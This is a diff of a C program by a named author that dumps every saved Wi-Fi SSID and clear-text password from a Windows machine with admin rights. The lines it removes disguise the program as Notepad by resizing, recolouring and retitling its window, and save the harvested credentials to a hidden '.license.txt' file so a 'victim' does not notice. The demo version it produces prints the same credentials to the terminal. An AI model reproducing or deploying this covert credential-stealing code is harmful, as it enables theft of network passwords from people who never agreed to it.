@@ -1,25 +1,21 @@
 /**
- * @file dumper.c
+ * @file demo.c
  * @author Francisco Spínola (fssecur3@outlook.com)
  * @brief Dump Wi-Fi credentials from Windows machines (needs admin privileges)
- * @version 0.3
+ * @version 0.2
  * @date 2021-03-10
  * @copyright Copyright (c) 2021
  * 
  * DESCRIPTION
- * Do not use this software for malicious purposes!
- * When executed, tries to hide itself (if a GUI can be created) by resizing the window and changing the background 
- * color to white, looking similar to a notepad. The window title is also renamed to "Notepad"
- * Finally, a file named (for obfuscation) ".licence.txt" is created with all the credentials stored in the system
+ * Do not redistribute or use this software for malicious purposes!
+ * This is the demonstration executable, where the output will be shown in the terminal only 
+ * (no file will be created), waiting, at the end, for user input.
  * 
  * COMPILING
- * $ gcc dumper.c -o dumper.exe
+ * $ gcc demo.c -o demo.exe
  * 
  * EXECUTION
  * You can execute the program on a terminal or by double clicking the executable.
- * 
- * WARNING
- * Careful when double clicking, since you will spawn a GUI and that can warn a "victim" of what's happening.
  */
 
 #include <stdio.h>
@@ -31,6 +27,14 @@
 #define BUFFER 59
 #define PWD 64
 
+void to32(char *string) {
+    int i = strlen(string);
+    while (i < 32) {
+        printf(" ");
+        i++;
+    }
+}
+
 //Retrieve the Wi-Fi passwords
 char *password (char *ssid) {
     char *pwd = NULL;
@@ -41,6 +45,7 @@ char *password (char *ssid) {
     strncat(cmd, "\"", 1);
     
     if ((process = popen(cmd, "r")) == NULL) {
+        printf("Error opening pipe!\n");
         exit(0);
     }
     
@@ -66,6 +71,7 @@ char *password (char *ssid) {
     }
     
     if (pclose(process)) {
+        printf("Command not found or exited with error status\n");
         exit(0);
     }
     
@@ -74,23 +80,6 @@ char *password (char *ssid) {
     }
     
     return pwd;
-}
-
-//Saves the ssids by writing to a text file
-void write(char ssids[][SSID], char passwords[][PWD], int *count) {
-    FILE *f = fopen(".license.txt", "w");
-    if (f == NULL) {
-        exit(1);
-    }
-
-    //print some text
-    int i = 0;
-    while (i < *count) {
-        fprintf(f, "%s:%s\n", ssids[i], passwords[i]);
-        ++i;
-    }
-
-    fclose(f);
 }
 
 //Retrieve the Wi-Fi SSIDs
@@ -104,15 +93,29 @@ void ssid(int *count) {
     char buf[BUFFER];
 
     if ((process = popen(cmd, "r")) == NULL) {
+        printf("Error opening pipe!\n");
         exit(0);
     }
 
+    printf("|               SSID              |            PASSWORD             |\n");
+    int i = 0;
+    printf("|");
+    while (i < 67) {
+        printf("-");
+        i++;
+    }
+    printf("|\n");
     while (fgets(buf, BUFFER, process) != NULL) {
+        bool go = false;
         char *token;
 
         token = strtok(buf, ":");
-        token = strtok(NULL, ":");
         if (strcmp(buf, "    All User Profile     ") == 0) {
+            go = true;
+        }
+        
+        token = strtok(NULL, ":");
+        if (go) {
             if (token != NULL) {
                 ssid = token;
             }
@@ -121,15 +124,24 @@ void ssid(int *count) {
             strncpy(ssids[(*count)], ssid, SSID);
             pwd = password(ssid);
             strncpy(passwords[(*count)], pwd, PWD);
+            printf("| %s", ssids[(*count)]);
+            if (strlen(ssid) < 32) {
+                to32(ssid);
+            }
+            printf(":");
+            if (strlen(passwords[(*count)]) < 32) {
+                to32(passwords[(*count)]);
+            }
+            printf("%s |", passwords[(*count)]);
+            printf("\n");
             (*count)++;
         }
     }
 
     if (pclose(process)) {
+        printf("Command not found or exited with error status\n");
         exit(0);
     }
-
-    write(ssids, passwords, count);
 }
 
 //Check if user has admin rights (since we need it to use "key=clear")
@@ -153,16 +165,27 @@ bool checkAdmin () {
 
 //Main
 int main(int argc, char **argv) {
-    system("mode con:cols=15 lines=1");
-    system("color f0");
-    system("title Notepad");
-
     if (!checkAdmin()) {
         return -1;
     }
-    
+
     int count = 0;
+    int i = 0;
+    printf(" ");
+    while (i < 67) {
+        printf("-");
+        i++;
+    }
+    printf("\n");
+    i = 0;
     ssid(&count);
-    
+    printf(" ");
+    while (i < 66) {
+        printf("-");
+        i++;
+    }
+    printf("\n");
+    system("pause");
+
     return 0;
 }
